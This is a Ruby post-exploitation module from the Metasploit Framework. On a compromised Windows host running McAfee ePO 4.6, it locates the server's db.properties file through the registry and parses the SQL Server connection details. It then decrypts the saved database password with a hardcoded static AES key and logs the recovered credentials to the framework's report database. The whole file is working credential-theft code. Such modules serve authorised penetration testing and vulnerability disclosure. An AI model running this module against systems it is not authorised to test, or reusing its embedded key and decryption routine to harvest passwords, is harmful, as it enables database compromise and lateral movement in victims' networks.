##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/windows/registry'
require "net/dns/resolver"
require 'msf/core/auxiliary/report'

class Metasploit3 < Msf::Post

  include Msf::Post::Windows::Registry
  include Msf::Auxiliary::Report

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Gather McAfee ePO 4.6 Config SQL Credentials',
      'Description'   => %q{
        This module extracts connection details and decrypts the saved password for the
        SQL database in use by a McAfee ePO 4.6 server. The passwords are stored in a
        config file. They are encrypted with AES-128-ECB and a static key.
      },
      'License'       => MSF_LICENSE,
      'Author'        => ['Nathan Einwechter <neinwechter[at]gmail.com>'],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))
  end

  def run
    # Find out where things are installed
    print_status("Finding Tomcat install path...")
    subkeys = registry_enumkeys("HKLM\\Software\\Network Associates\\ePolicy Orchestrator")
    if subkeys.nil? or subkeys.empty?
      print_error ("ePO 4.6 Not Installed or No Permissions to RegKey")
      return
    end
    # Get the db.properties file location
    epol_reg_key = "HKLM\\Software\\Network Associates\\ePolicy Orchestrator"
    dbprops_file = registry_getvaldata(epol_reg_key, "TomcatFolder")
    if dbprops_file == nil or dbprops_file == ""
      print_error("Could not find db.properties file location")
    else
      dbprops_file << "/conf/orion/db.properties";
      print_good("Found db.properties location");
      process_config(dbprops_file);
    end
  end

  def process_config(filename)
    config = client.fs.file.new(filename, 'r')
    print_status("Processing #{filename}")
    contents = config.read
    config_lines = contents.split("\n")
    for line in config_lines
      line.chomp
      line_array = line.split('=')
      case line_array[0]
      when "db.database.name"
        database_name = ""
        line_array[1].each_byte { |x|  database_name << x unless x > 126 || x < 32 }
      when "db.instance.name"
        database_instance = ""
        line_array[1].each_byte { |x|  database_instance << x unless x > 126 || x < 32 }
      when "db.user.domain"
        user_domain = ""
        line_array[1].each_byte { |x|  user_domain << x unless x > 126 || x < 32 }
      when "db.user.name"
        user_name = ""
        line_array[1].each_byte { |x|  user_name << x unless x > 126 || x < 32 }
      when "db.port"
        port = ""
        line_array[1].each_byte { |x|  port << x unless x > 126 || x < 32 }
      when "db.user.passwd.encrypted.ex"
        # ePO 4.6 encrypted password
        passwd = ""
        line_array[1].each_byte { |x|  passwd << x unless x > 126 || x < 32 }
        passwd.gsub("\\","")
        # Add any Base64 padding that may have been stripped out
        passwd << "=" until ( passwd.length % 4 == 0 )
        plaintext_passwd = decrypt46(passwd)
      when "db.user.passwd.encrypted"
        # ePO 4.5 encrypted password - not currently supported, see notes below
        passwd = ""
        line_array[1].each_byte { |x|  passwd << x unless x > 126 || x < 32 }
        passwd.gsub("\\","")
        # Add any Base64 padding that may have been stripped out
        passwd << "=" until ( passwd.length % 4 == 0 )
        plaintext_passwd = "PASSWORD NOT RECOVERED - ePO 4.5 DECRYPT SUPPORT IS WIP"
      when "db.server.name"
        database_server_name = ""
        line_array[1].each_byte { |x|  database_server_name << x unless x > 126 || x < 32 }
      end
    end

    # resolve IP address for creds reporting
    #Code borrowed from Rob fuller's dig module
    if client.platform =~ /^x64/
      size = 64
      addrinfoinmem = 32
    else
      size = 32
      addrinfoinmem = 24
    end

    result = client.railgun.ws2_32.getaddrinfo(database_server_name,nil,nil,4)
    if result['GetLastError'] == 11001
      print_error("Could not determine IP of DB - credentials not added to report database")
      return
    end
    addrinfo = client.railgun.memread( result['ppResult'], size )
    ai_addr_pointer = addrinfo[addrinfoinmem,4].unpack('L').first
    sockaddr = client.railgun.memread( ai_addr_pointer, size/2 )
    ip = sockaddr[4,4].unpack('N').first
    db_ip = Rex::Socket.addr_itoa(ip)

    print_good("SQL Server: #{database_server_name}")
    print_good("SQL Instance: #{database_instance}")
    print_good("Database Name: #{database_name}")
    if db_ip
      print_good("Database IP: #{db_ip}")
    end
    print_good("Port: #{port}")
    if user_domain == nil or user_domain == ""
      print_good("Authentication Type: SQL");
      full_user = user_name
    else
      print_good("Authentication Type: Domain");
      print_good("Domain: #{user_domain}");
      full_user = "#{user_domain}\\#{user_name}"
    end
    print_good("User: #{full_user}")
    print_good("Password: #{plaintext_passwd}")

    if (db_ip)
      # submit to reports
      if session.db_record
        source_id = session.db_record.id
      else
        source_id = nil
      end
      report_auth_info(
        :host => db_ip,
        :port => port,
        :sname => 'mssql',
        :user => full_user,
        :pass => plaintext_passwd,
        :source_id => source_id,
        :source_type => "exploit",
        :active => true
      )
      print_good("Added credentials to report database")
    else
      print_error("Could not determine IP of DB - credentials not added to report database")
    end
  end


  def decrypt46(encoded)
    encrypted_data = Rex::Text.decode_base64(encoded)
    aes = OpenSSL::Cipher::Cipher.new("AES-128-ECB")
    aes.padding = 0
    aes.decrypt
    # Private key extracted from ePO 4.6.0 Build 1029
    # If other keys are required for other versions of 4.6 - will have to add version
    # identification routines in to the main part of the module
    key = [ 94, -100, 62, -33, -26, 37, -124, 54, 102, 33, -109, -128, 49, 90, 41, 51 ]
    aes.key = key.pack('C*')
    password = aes.update(encrypted_data) + aes.final
    # Get rid of all the crazy \f's that result
    password.gsub!(/[^[:print:]]/,'')
    return password
  end


end
